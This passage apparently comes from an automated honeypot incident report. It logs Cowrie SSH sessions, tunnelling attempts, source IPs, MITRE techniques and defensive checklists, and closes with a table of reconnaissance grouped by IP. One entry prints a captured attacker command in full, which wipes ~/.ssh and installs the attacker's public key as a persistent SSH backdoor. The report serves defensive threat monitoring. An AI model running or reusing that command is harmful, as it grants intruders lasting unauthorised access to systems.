| **Last Seen** | 2026-08-24 06:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:16:17` | `cowrie.session.connect` |
| `2026-08-24 06:16:17` | `cowrie.client.version` |
| `2026-08-24 06:16:17` | `cowrie.client.kex` |
| `2026-08-24 06:16:18` | `cowrie.login.success` |
| `2026-08-24 06:16:18` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:16:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 06:16:18` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:16:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87c29e17f6ae

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 06:16 |
| **Last Seen** | 2026-08-24 06:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:16:21` | `cowrie.session.connect` |
| `2026-08-24 06:16:21` | `cowrie.client.version` |
| `2026-08-24 06:16:21` | `cowrie.client.kex` |
| `2026-08-24 06:16:22` | `cowrie.login.success` |
| `2026-08-24 06:16:22` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:16:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 06:16:22` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:16:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95d42cad78c4

| Field | Detail |
|---|---|
| **Source IP** | `38.199.201[.]3` |
| **First Seen** | 2026-08-24 06:19 |
| **Last Seen** | 2026-08-24 06:20 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:19:51` | `cowrie.session.connect` |
| `2026-08-24 06:19:53` | `cowrie.client.version` |
| `2026-08-24 06:19:53` | `cowrie.client.kex` |
| `2026-08-24 06:19:57` | `cowrie.login.success` |
| `2026-08-24 06:19:58` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:20:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.199.201[.]3` to AbuseIPDB if not already reported
- [ ] Block `38.199.201[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1314730c2a1a

| Field | Detail |
|---|---|
| **Source IP** | `45.187.33[.]152` |
| **First Seen** | 2026-08-24 06:20 |
| **Last Seen** | 2026-08-24 06:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:20:04` | `cowrie.session.connect` |
| `2026-08-24 06:20:04` | `cowrie.client.version` |
| `2026-08-24 06:20:04` | `cowrie.client.kex` |
| `2026-08-24 06:20:06` | `cowrie.login.success` |
| `2026-08-24 06:20:07` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.187.33[.]152` to AbuseIPDB if not already reported
- [ ] Block `45.187.33[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea1ec7589715

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 06:25 |
| **Last Seen** | 2026-08-24 06:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:25:48` | `cowrie.session.connect` |
| `2026-08-24 06:25:48` | `cowrie.client.version` |
| `2026-08-24 06:25:48` | `cowrie.client.kex` |
| `2026-08-24 06:25:49` | `cowrie.login.success` |
| `2026-08-24 06:25:49` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:25:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 06:25:49` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6628e697bf52

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 06:25 |
| **Last Seen** | 2026-08-24 06:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:25:52` | `cowrie.session.connect` |
| `2026-08-24 06:25:52` | `cowrie.client.version` |
| `2026-08-24 06:25:52` | `cowrie.client.kex` |
| `2026-08-24 06:25:53` | `cowrie.login.success` |
| `2026-08-24 06:25:53` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:25:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 06:25:53` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:25:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f16ebe70bc00

| Field | Detail |
|---|---|
| **Source IP** | `177.72.87[.]7` |
| **First Seen** | 2026-08-24 06:27 |
| **Last Seen** | 2026-08-24 06:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:27:56` | `cowrie.session.connect` |
| `2026-08-24 06:27:57` | `cowrie.client.version` |
| `2026-08-24 06:27:57` | `cowrie.client.kex` |
| `2026-08-24 06:28:00` | `cowrie.login.success` |
| `2026-08-24 06:28:00` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:28:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.72.87[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.72.87[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1cab152ac90

| Field | Detail |
|---|---|
| **Source IP** | `1.20.178[.]157` |
| **First Seen** | 2026-08-24 06:28 |
| **Last Seen** | 2026-08-24 06:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:28:06` | `cowrie.session.connect` |
| `2026-08-24 06:28:07` | `cowrie.client.version` |
| `2026-08-24 06:28:07` | `cowrie.client.kex` |
| `2026-08-24 06:28:09` | `cowrie.login.success` |
| `2026-08-24 06:28:10` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.20.178[.]157` to AbuseIPDB if not already reported
- [ ] Block `1.20.178[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c135401995da

| Field | Detail |
|---|---|
| **Source IP** | `123.52.202[.]92` |
| **First Seen** | 2026-08-24 06:32 |
| **Last Seen** | 2026-08-24 06:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:32:20` | `cowrie.session.connect` |
| `2026-08-24 06:32:21` | `cowrie.client.version` |
| `2026-08-24 06:32:21` | `cowrie.client.kex` |
| `2026-08-24 06:32:24` | `cowrie.login.success` |
| `2026-08-24 06:32:25` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:32:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.52.202[.]92` to AbuseIPDB if not already reported
- [ ] Block `123.52.202[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f0f957bc214

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 06:35 |
| **Last Seen** | 2026-08-24 06:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:35:33` | `cowrie.session.connect` |
| `2026-08-24 06:35:33` | `cowrie.client.version` |
| `2026-08-24 06:35:33` | `cowrie.client.kex` |
| `2026-08-24 06:35:34` | `cowrie.login.success` |
| `2026-08-24 06:35:34` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:35:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 06:35:34` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eebea156df31

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 06:35 |
| **Last Seen** | 2026-08-24 06:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:35:36` | `cowrie.session.connect` |
| `2026-08-24 06:35:37` | `cowrie.client.version` |
| `2026-08-24 06:35:37` | `cowrie.client.kex` |
| `2026-08-24 06:35:38` | `cowrie.login.success` |
| `2026-08-24 06:35:38` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:35:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 06:35:38` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4ce55768b72

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]50` |
| **First Seen** | 2026-08-24 06:36 |
| **Last Seen** | 2026-08-24 06:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:36:49` | `cowrie.session.connect` |
| `2026-08-24 06:36:50` | `cowrie.client.version` |
| `2026-08-24 06:36:50` | `cowrie.client.kex` |
| `2026-08-24 06:36:52` | `cowrie.login.success` |
| `2026-08-24 06:36:53` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:36:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]50` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-669c7d2b9848

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-24 06:41 |
| **Last Seen** | 2026-08-24 06:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:41:35` | `cowrie.session.connect` |
| `2026-08-24 06:41:35` | `cowrie.client.version` |
| `2026-08-24 06:41:36` | `cowrie.client.kex` |
| `2026-08-24 06:41:36` | `cowrie.login.success` |
| `2026-08-24 06:41:36` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:41:36` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:41:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b25e8e70152c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 06:45 |
| **Last Seen** | 2026-08-24 06:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:45:10` | `cowrie.session.connect` |
| `2026-08-24 06:45:10` | `cowrie.client.version` |
| `2026-08-24 06:45:10` | `cowrie.client.kex` |
| `2026-08-24 06:45:11` | `cowrie.login.success` |
| `2026-08-24 06:45:11` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:45:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 06:45:11` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6388dcc1cb3f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 06:45 |
| **Last Seen** | 2026-08-24 06:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:45:14` | `cowrie.session.connect` |
| `2026-08-24 06:45:14` | `cowrie.client.version` |
| `2026-08-24 06:45:14` | `cowrie.client.kex` |
| `2026-08-24 06:45:15` | `cowrie.login.success` |
| `2026-08-24 06:45:15` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:45:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 06:45:15` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-432fa14e141a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.90[.]166` |
| **First Seen** | 2026-08-24 06:45 |
| **Last Seen** | 2026-08-24 06:45 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:45:15` | `cowrie.session.connect` |
| `2026-08-24 06:45:18` | `cowrie.client.version` |
| `2026-08-24 06:45:18` | `cowrie.client.kex` |
| `2026-08-24 06:45:18` | `cowrie.login.success` |
| `2026-08-24 06:45:20` | `cowrie.session.params` |
| `2026-08-24 06:45:20` | `cowrie.command.input` |
| `2026-08-24 06:45:20` | `cowrie.command.failed` |
| `2026-08-24 06:45:20` | `cowrie.log.closed` |
| `2026-08-24 06:45:21` | `cowrie.session.params` |
| `2026-08-24 06:45:21` | `cowrie.command.input` |
| `2026-08-24 06:45:21` | `cowrie.session.file_download` |
| `2026-08-24 06:45:21` | `cowrie.log.closed` |
| `2026-08-24 06:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `120.48.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac20c351731b

| Field | Detail |
|---|---|
| **Source IP** | `120.48.90[.]166` |
| **First Seen** | 2026-08-24 06:45 |
| **Last Seen** | 2026-08-24 06:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:45:21` | `cowrie.session.connect` |
| `2026-08-24 06:45:24` | `cowrie.client.version` |
| `2026-08-24 06:45:24` | `cowrie.client.kex` |
| `2026-08-24 06:45:28` | `cowrie.login.success` |
| `2026-08-24 06:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `120.48.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8306c6dfc565

| Field | Detail |
|---|---|
| **Source IP** | `187.218.57[.]50` |
| **First Seen** | 2026-08-24 06:52 |
| **Last Seen** | 2026-08-24 06:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:52:18` | `cowrie.session.connect` |
| `2026-08-24 06:52:19` | `cowrie.client.version` |
| `2026-08-24 06:52:19` | `cowrie.client.kex` |
| `2026-08-24 06:52:20` | `cowrie.login.success` |
| `2026-08-24 06:52:21` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:52:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.218.57[.]50` to AbuseIPDB if not already reported
- [ ] Block `187.218.57[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-609be1ff5248

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-08-24 06:52 |
| **Last Seen** | 2026-08-24 06:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:52:26` | `cowrie.session.connect` |
| `2026-08-24 06:52:27` | `cowrie.client.version` |
| `2026-08-24 06:52:27` | `cowrie.client.kex` |
| `2026-08-24 06:52:29` | `cowrie.login.success` |
| `2026-08-24 06:52:30` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b6a58a89128

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 06:54 |
| **Last Seen** | 2026-08-24 06:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:54:50` | `cowrie.session.connect` |
| `2026-08-24 06:54:50` | `cowrie.client.version` |
| `2026-08-24 06:54:50` | `cowrie.client.kex` |
| `2026-08-24 06:54:51` | `cowrie.login.success` |
| `2026-08-24 06:54:51` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:54:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 06:54:51` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50703ac2d9ca

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 06:54 |
| **Last Seen** | 2026-08-24 06:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:54:53` | `cowrie.session.connect` |
| `2026-08-24 06:54:53` | `cowrie.client.version` |
| `2026-08-24 06:54:53` | `cowrie.client.kex` |
| `2026-08-24 06:54:54` | `cowrie.login.success` |
| `2026-08-24 06:54:54` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:54:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 06:54:55` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `134.209.229[.]23` | **59** | 2026-08-24 03:05 | 2026-08-24 06:54 | 59m | 0 | `T1592` | 🟠 MEDIUM |
| `120.48.90[.]166` | **37** | 2026-08-24 03:20 | 2026-08-24 06:54 | 72m | 0 | `T1592` | 🟠 MEDIUM |
| `207.175.114[.]79` | **30** | 2026-08-24 04:43 | 2026-08-24 04:43 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `34.77.108[.]93` | **30** | 2026-08-24 06:12 | 2026-08-24 06:13 | 1m | 0 | `T1592` | 🟠 MEDIUM |
| `35.241.157[.]87` | **30** | 2026-08-24 05:20 | 2026-08-24 05:20 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-08-24 03:16 | 2026-08-24 06:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]217` | **5** | 2026-08-24 04:51 | 2026-08-24 04:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]33` | **5** | 2026-08-24 05:25 | 2026-08-24 05:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `178.74.109[.]143` | **4** | 2026-08-24 04:30 | 2026-08-24 04:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.164.151[.]197` | **4** | 2026-08-24 04:15 | 2026-08-24 04:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.52.177[.]250` | **3** | 2026-08-24 05:48 | 2026-08-24 05:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]133` | **3** | 2026-08-24 04:41 | 2026-08-24 04:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]105` | **3** | 2026-08-24 04:41 | 2026-08-24 04:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]66` | **3** | 2026-08-24 03:54 | 2026-08-24 03:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]82` | **3** | 2026-08-24 05:26 | 2026-08-24 05:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `83.246.166[.]68` | **3** | 2026-08-24 06:41 | 2026-08-24 06:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.26.6[.]111` | **2** | 2026-08-24 04:27 | 2026-08-24 04:29 | 2m | 0 | `T1592` | 🟢 LOW |
| `188.240.59[.]37` | **2** | 2026-08-24 05:38 | 2026-08-24 06:37 | 0m | 0 | `T1592` | 🟢 LOW |
